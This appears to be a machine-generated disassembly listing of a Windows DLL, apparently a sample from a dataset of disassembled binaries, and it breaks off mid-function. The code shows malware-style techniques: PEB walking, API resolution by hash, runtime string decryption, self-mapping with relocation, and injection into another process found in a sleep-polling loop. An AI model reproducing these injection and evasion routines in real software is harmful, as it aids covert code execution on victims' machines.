sub_10001000
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec eax
push esi
cmp eax 0x1a
ja r-xdata
xor eax eax
jmp [ eax * 4 + jump_table_1000111c ]
mov esi r--data
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
pop esi
pop ebp
retn
push 0x0
push r--data
push esi
call sub_10002ea0
pop ecx
push eax
push esi
call sub_10002ebf
add esp 0x10
jmp r-xdata
sub_10001188
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x12d
push esi
cmp eax ecx
jg r-xdata
mov ecx 0x191
cmp eax ecx
jg r-xdata
je r-xdata
mov ecx 0x25d
cmp eax ecx
jg r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
cmp eax 0x23
jg r-xdata
mov ecx 0x2bd
cmp eax ecx
jg r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
add eax 0xfffffed2
cmp eax 0x8
ja r-xdata
push 0x0
push r--data
push esi
call sub_10002ea0
pop ecx
push eax
push esi
call sub_10002ebf
add esp 0x10
jmp r-xdata
cmp eax 0x65
jg r-xdata
je r-xdata
xor eax eax
je r-xdata
mov esi r--data
jmp r-xdata
mov ecx 0x197
cmp eax ecx
jg r-xdata
jmp [ eax * 4 + jump_table_10001784 ]
pop esi
pop ebp
retn
mov ecx 0xc9
cmp eax ecx
jg r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
cmp eax 0x21
ja r-xdata
mov esi r--data
jmp r-xdata
add eax 0xfffffda2
cmp eax 0x8
ja r-xdata
sub eax 0x1f5
je r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
cmp eax 0xca
jne r-xdata
je r-xdata
mov esi r--data
jmp r-xdata
add eax 0xffffffdc
cmp eax 0x14
ja r-xdata
jmp [ eax * 4 + jump_table_10001680 ]
jmp [ eax * 4 + jump_table_100017a8 ]
mov esi r--data
jmp r-xdata
sub eax 0x64
je r-xdata
mov esi r--data
jmp r-xdata
sub eax 0x192
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
add eax 0xffffff9a
cmp eax 0x9
ja r-xdata
jmp [ eax * 4 + jump_table_10001708 ]
mov esi r--data
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
jmp [ eax * 4 + jump_table_1000175c ]
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
jne r-xdata
mov esi r--data
jmp r-xdata
dec eax
je r-xdata
mov esi r--data
jmp r-xdata
mov esi r--data
jmp r-xdata
dec eax
jne r-xdata
mov esi r--data
jmp r-xdata
sub_100017d3
push ebp
mov ebp esp
mov eax [ fs : 0x30 ]
push esi
push edi
mov edi [ eax + 0xc ]
add edi 0xc
mov esi [ edi ]
jmp r-xdata
cmp esi edi
jne r-xdata
movzx eax [ esi + 0x2c ]
push 0x1
push eax
push [ esi + 0x30 ]
call sub_1000320e
add esp 0xc
cmp eax [ ebp + 0x8 ]
je r-xdata
xor eax eax
mov eax [ esi + 0x18 ]
jmp r-xdata
mov esi [ esi ]
pop edi
pop esi
pop ebp
retn
sub_1000182a
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push esi
push 0x2e
push edi
call sub_10003041
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
pop esi
sub eax edi
push eax
push edi
call sub_100030d3
push r--data
push r--data
push eax
mov [ ebp + 0x8 ] eax
call sub_100030f9
push [ ebp + 0x8 ]
mov edi eax
call sub_100021d8
add esp 0x18
inc esi
cmp [ esi ] 0x23
jne r-xdata
pop edi
pop ebp
retn
push 0x0
push 0x0
push esi
call sub_1000326d
push eax
push 0x0
push edi
call sub_10001f17
add esp 0x18
inc esi
push esi
call sub_10003020
push eax
push 0x0
push edi
call sub_10001f17
add esp 0x10
jmp r-xdata
sub_100018c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1 ]
cmp ecx 0x242
ja r-xdata
xor al al
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov [ eax * 4 + rw-data ] ecx
mov al 0x1
pop ebp
retn
sub_100018e7
push ebp
mov ebp esp
push 0x2b
call sub_100018a8
mov edx eax
pop ecx
test edx edx
jne r-xdata
push [ ebp + 0x8 ]
call edx
pop ebp
retn
push 0xa48d6762
push 0x1
push eax
call sub_10001f17
mov edx eax
push edx
push 0x2b
call sub_100018c4
add esp 0x14
sub_10001919
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x3c ]
lea eax [ eax + ecx + 0x18 ]
push ebx
push esi
mov esi [ eax + 0x60 ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
shr eax 0x10
add esi ecx
push edi
test ax ax
jne r-xdata
xor eax eax
leave
retn
mov edi [ esi + 0x20 ]
mov ebx [ esi + 0x24 ]
and [ ebp - 0x4 ] 0x0
add edi ecx
add ebx ecx
cmp [ esi + 0x18 ] 0x0
jbe r-xdata
movzx eax [ ebp + 0xc ]
sub eax [ esi + 0x10 ]
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
test eax eax
jns r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
push 0x0
add eax ecx
push 0x0
push eax
call sub_1000326d
add esp 0xc
cmp eax [ ebp + 0xc ]
je r-xdata
mov edx [ esi + 0x1c ]
lea eax [ edx + eax * 4 ]
mov eax [ eax + ecx ]
add eax ecx
cmp eax esi
jbe r-xdata
movzx eax [ ebx ]
mov ecx [ ebp + 0x8 ]
add edi 0x4
add ebx 0x2
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x18 ]
jb r-xdata
mov ecx eax
sub ecx esi
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
jmp r-xdata
push eax
call sub_1000182a
pop ecx
sub_100019c6
push ebp
mov ebp esp
push edi
push [ ebp + 0x8 ]
call sub_100018a8
mov edi eax
pop ecx
test edi edi
jne r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
mov ebx [ ebp + 0x14 ]
push esi
xor esi esi
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
call sub_10001188
pop ecx
mov ebx eax
push [ ebp + 0xc ]
call sub_10001000
mov esi eax
push esi
call sub_100018e7
pop ecx
pop ecx
call sub_10001810
jmp r-xdata
push ebx
push eax
call sub_10001fa9
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push esi
call sub_100021d8
pop ecx
push esi
call sub_10001a51
push edi
push [ ebp + 0x8 ]
call sub_100018c4
pop ecx
pop ecx
pop esi
pop ebx
push ebx
call sub_100021d8
pop ecx
sub_10001a51
push ebp
mov ebp esp
sub esp 0x20
push edi
xor eax eax
mov [ ebp - 0x20 ] 0x0
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] 0xa2a17128
mov [ ebp - 0xc ] 0x2c821fb0
mov [ ebp - 0x8 ] 0x2729fc95
mov [ ebp - 0x4 ] 0x0
call sub_10002ea0
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_100041e0
lea eax [ ebp - 0x20 ]
push eax
call sub_10002ea0
add esp 0x14
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_100034ac
push eax
call sub_10003d5d
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x1
push 0x2
call sub_100019c6
add esp 0x1c
push [ ebp + 0x8 ]
call eax
pop edi
leave
retn 0x4
sub_10001b12
push ebp
mov ebp esp
push 0x0
push 0xa
push 0x1
push 0x19
call sub_100019c6
add esp 0x10
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001b80
push ebp
mov ebp esp
push 0x0
push 0x2
push 0x1
push 0x26
call sub_100019c6
add esp 0x10
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001ba9
push ebp
mov ebp esp
push 0x0
push 0x1
push 0x1
push 0x28
call sub_100019c6
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001c15
push ebp
mov ebp esp
push 0x0
push 0x1c
push 0x1
push 0x3c
call sub_100019c6
add esp 0x10
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001c60
push ebp
mov ebp esp
push 0x0
push 0x15
push 0x1
push 0x56
call sub_100019c6
add esp 0x10
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001c80
push ebp
mov ebp esp
push 0x0
push 0xb
push 0x1
push 0x5a
call sub_100019c6
add esp 0x10
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001cfd
push ebp
mov ebp esp
sub esp 0x20
push edi
xor eax eax
mov [ ebp - 0x20 ] 0x0
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] 0x96b47b23
mov [ ebp - 0xc ] 0x3b83198e
mov [ ebp - 0x8 ] 0x318fd87
mov [ ebp - 0x4 ] 0x26dd
mov [ ebp - 0x2 ] 0x0
call sub_10002ea0
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_100041e0
lea eax [ ebp - 0x20 ]
push eax
call sub_10002ea0
add esp 0x14
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_100034ac
push eax
call sub_10003d5d
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x1
push 0x93
call sub_100019c6
add esp 0x1c
call eax
pop edi
leave
retn
sub_10001d7e
push ebp
mov ebp esp
sub esp 0x18
push edi
xor eax eax
mov [ ebp - 0x18 ] 0x0
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] 0xb6a17b2c
mov [ ebp - 0x8 ] 0x318c1abd
mov [ ebp - 0x4 ] 0x97
call sub_10002ea0
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_100041e0
lea eax [ ebp - 0x18 ]
push eax
call sub_10002ea0
add esp 0x14
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_100034ac
push eax
call sub_10003d5d
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x1
push 0x94
call sub_100019c6
add esp 0x1c
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop edi
leave
retn
sub_10001dfb
push ebp
mov ebp esp
push 0x0
push 0xf
push 0x1
push 0x95
call sub_100019c6
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001e21
push ebp
mov ebp esp
sub esp 0x18
push edi
xor eax eax
mov [ ebp - 0x18 ] 0x0
lea edi [ ebp - 0x17 ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] 0xb6a17b2c
mov [ ebp - 0x8 ] 0x3b8504ba
mov [ ebp - 0x4 ] 0x0
call sub_10002ea0
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_100041e0
lea eax [ ebp - 0x18 ]
push eax
call sub_10002ea0
add esp 0x14
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_100034ac
push eax
call sub_10003d5d
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x1
push 0x97
call sub_100019c6
add esp 0x1c
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop edi
leave
retn 0xc
sub_10001eb9
push ebp
mov ebp esp
push 0x0
push 0x6f
push 0x5
push 0x1a2
call sub_100019c6
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001edf
push ebp
mov ebp esp
push 0x0
push 0x65
push 0x5
push 0x1a4
call sub_100019c6
add esp 0x10
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001f17
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] esi
jne r-xdata
call sub_10001810
mov esi eax
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100018e7
mov esi eax
pop ecx
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10001000
pop ecx
mov [ ebp + 0x8 ] eax
test esi esi
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_10001a51
mov esi eax
cmp [ ebp + 0x8 ] esi
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_10001919
pop ecx
pop ecx
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
sub_10001f77
push ebp
mov ebp esp
push [ ebp + 0x14 ]
call sub_100018a8
mov edx eax
pop ecx
test edx edx
jne r-xdata
mov eax edx
pop ebp
retn
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001f17
mov edx eax
push edx
push [ ebp + 0x14 ]
call sub_100018c4
add esp 0x14
sub_10001fa9
push ebp
mov ebp esp
push 0x7
push 0x1fc0eaee
push 0x1
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001fc9
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn
push esi
push edi
pop edi
pop esi
add ecx 0xfffffff8
xor edi edi
lea edx [ eax + 0x8 ]
test ecx 0xfffffffe
jbe r-xdata
add eax [ eax + 0x4 ]
mov ecx eax
sub ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0x14 ]
jb r-xdata
movzx esi [ edx ]
mov ecx esi
and ecx 0xfff
add ecx [ eax ]
shr si 0xc
cmp si 0x3
je r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
add ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
add [ ecx ] esi
cmp si 0xa
jne r-xdata
mov ecx [ eax + 0x4 ]
sub ecx 0x8
add edx 0x2
inc edi
shr ecx 0x1
cmp edi ecx
jb r-xdata
sub_10002034
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and eax 0xffff0000
mov edx 0x1000
mov eax sub_10002034
sub eax edx
jmp r-xdata
mov ecx [ eax + 0x3c ]
cmp ecx edx
jge r-xdata
mov ecx 0x5a4d
cmp [ eax ] cx
jne r-xdata
cmp [ ecx + eax ] 0x4550
je r-xdata
pop ebp
retn 0x4
sub_1000206f
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0xc ]
call sub_10002034
mov ebx eax
mov esi [ ebx + 0x3c ]
mov eax [ esi + ebx + 0x50 ]
xor edi edi
push edi
push eax
push edi
push 0x40
push edi
push 0xffffffff
mov [ ebp - 0x8 ] eax
call sub_10001b80
push edi
push edi
push edi
push 0x2
push eax
mov [ ebp - 0x10 ] eax
call sub_10001ba9
add esp 0x2c
mov [ ebp - 0xc ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x8 ]
push ebx
push eax
call sub_10002249
or [ ebp - 0x18 ] 0xffffffff
push 0x40
push edi
push 0x1
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
push [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edi
call sub_10001edf
add esp 0x34
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi [ ebp - 0x18 ]
push [ esi + ebx + 0xa4 ]
mov eax [ ebp - 0x4 ]
sub eax ebx
push eax
mov eax [ esi + ebx + 0xa0 ]
push [ ebp - 0xc ]
add eax ebx
push eax
call sub_10001fc9
mov esi [ ebp - 0x4 ]
sub esi ebx
add esp 0x10
add esi [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0xc ]
call sub_10001bcf
push [ ebp - 0x10 ]
call sub_10001acc
pop ecx
pop ecx
mov eax esi
sub_10002138
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
push 0x43a
call sub_10001c80
push [ ebp + 0xc ]
mov esi eax
push esi
call sub_1000206f
add esp 0x14
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10001acc
pop ecx
pop esi
mov al bl
pop ebx
pop ebp
retn
push ebx
push ebx
push [ ebp + 0x10 ]
push eax
push ebx
push ebx
push esi
call sub_10001b12
add esp 0x1c
test eax eax
setne bl
sub_10002183
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_100039f7
pop ecx
test eax eax
je r-xdata
push 0x7530
call [ Sleep@IAT ]
cmp eax 0xffffffff
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_10002138
add esp 0xc
leave
retn
xor al al
leave
retn
sub_100021d8
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
push 0x8
call sub_10001cfd
push eax
call sub_10001e21
pop ebp
retn
sub_100021f7
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jne r-xdata
push [ ebp + 0xc ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0x8 ]
push 0x8
call sub_10001cfd
push eax
call sub_10001dfb
add esp 0x10
pop ebp
retn
push 0x8
call sub_10001cfd
push eax
call sub_10001d7e
add esp 0xc
pop ebp
retn
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
push 0x8
call sub_10001cfd
push eax
call sub_10001e21
sub_10002249
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov ecx esi
je r-xdata
sub edx esi
mov al [ edx + ecx ]
dec [ ebp + 0x10 ]
mov [ ecx ] al
inc ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub_10002279
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov cl [ ebp + 0xc ]
dec [ ebp + 0x10 ]
mov [ eax ] cl
inc eax
sub_100022a8
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000229f
pop ecx
sub_100022c8
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor al al
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ ebp + 0x24 ] ebx
je r-xdata
cmp [ ebp + 0x28 ] ebx
je r-xdata
cmp [ ebp + 0x2c ] ebx
je r-xdata
push esi
push edi
mov esi 0x104
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
add esp 0x48
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push 0x10000
push ebx
mov edi rw-data
push edi
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
mov esi rw-data
push esi
call sub_10002279
push [ ebp + 0x8 ]
call sub_10002ea0
add esp 0x40
push eax
push [ ebp + 0x8 ]
push rw-data
call sub_10002249
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ rw-data ] eax
call sub_10002ea0
push eax
push [ ebp + 0x10 ]
push rw-data
call sub_10002249
push [ ebp + 0x14 ]
call sub_10002ea0
push eax
push [ ebp + 0x14 ]
push rw-data
call sub_10002249
push [ ebp + 0x18 ]
call sub_10002ea0
push eax
push [ ebp + 0x18 ]
push rw-data
call sub_10002249
push [ ebp + 0x1c ]
call sub_10002ea0
add esp 0x40
push eax
push [ ebp + 0x1c ]
push rw-data
call sub_10002249
push [ ebp + 0x20 ]
call sub_10002ea0
push eax
push [ ebp + 0x20 ]
push rw-data
call sub_10002249
push [ ebp + 0x24 ]
call sub_10002ea0
push eax
push [ ebp + 0x24 ]
push rw-data
call sub_10002249
push [ ebp + 0x28 ]
call sub_10002ea0
push eax
push [ ebp + 0x28 ]
push rw-data
call sub_10002249
push [ ebp + 0x2c ]
call sub_10002ea0
add esp 0x40
push eax
push [ ebp + 0x2c ]
push edi
call sub_10002249
add esp 0xc
cmp [ ebp + 0x38 ] bl
jne r-xdata
push [ ebp + 0x34 ]
call sub_10002ea0
push eax
push [ ebp + 0x34 ]
push esi
call sub_10002249
mov al [ ebp + 0x38 ]
add esp 0x10
pop edi
mov [ rw-data ] al
mov al 0x1
pop esi
jmp r-xdata
push [ ebp + 0x30 ]
call sub_10002ea0
push eax
push [ ebp + 0x30 ]
push rw-data
call sub_10002249
add esp 0x10
pop ebx
pop ebp
retn
sub_100024b4
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor al al
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x20 ] ebx
je r-xdata
cmp [ ebp + 0x24 ] ebx
je r-xdata
cmp [ ebp + 0x28 ] ebx
je r-xdata
cmp [ ebp + 0x2c ] ebx
je r-xdata
push esi
push edi
mov esi 0x104
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
add esp 0x48
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push 0x10000
push ebx
mov edi rw-data
push edi
call sub_10002279
push esi
push ebx
push rw-data
call sub_10002279
push esi
push ebx
mov esi rw-data
push esi
call sub_10002279
push [ ebp + 0x8 ]
call sub_10002ea0
add esp 0x40
push eax
push [ ebp + 0x8 ]
push rw-data
call sub_10002249
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov [ rw-data ] eax
call sub_10002ea0
push eax
push [ ebp + 0x10 ]
push rw-data
call sub_10002249
push [ ebp + 0x14 ]
call sub_10002ea0
push eax
push [ ebp + 0x14 ]
push rw-data
call sub_10002249
push [ ebp + 0x18 ]
call sub_10002ea0
push eax
push [ ebp + 0x18 ]
push rw-data
call sub_10002249
push [ ebp + 0x1c ]
call sub_10002ea0
add esp 0x40
push eax
push [ ebp + 0x1c ]
push rw-data
call sub_10002249
push [ ebp + 0x20 ]
call sub_10002ea0
push eax
push [ ebp + 0x20 ]
push rw-data
call sub_10002249
push [ ebp + 0x24 ]
call sub_10002ea0
push eax
push [ ebp + 0x24 ]
push rw-data
call sub_10002249
push [ ebp + 0x28 ]
call sub_10002ea0
push eax
push [ ebp + 0x28 ]
push rw-data
call sub_10002249
push [ ebp + 0x2c ]
call sub_10002ea0
add esp 0x40
push eax
push [ ebp + 0x2c ]
push edi
call sub_10002249
add esp 0xc
cmp [ ebp + 0x38 ] bl
jne r-xdata
push [ ebp + 0x34 ]
call sub_10002ea0
push eax
push [ ebp + 0x34 ]
push esi
call sub_10002249
mov al [ ebp + 0x38 ]
add esp 0x10
pop edi
mov [ rw-data ] al
mov al 0x1
pop esi
jmp r-xdata
push [ ebp + 0x30 ]
call sub_10002ea0
push eax
push [ ebp + 0x30 ]
push rw-data
call sub_10002249
add esp 0x10
pop ebx
pop ebp
retn
sub_100026bf
push ebp
mov ebp esp
push 0x1e3
push 0x8593dd7
push 0x8
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100026eb
push ebp
mov ebp esp
push 0x1d2
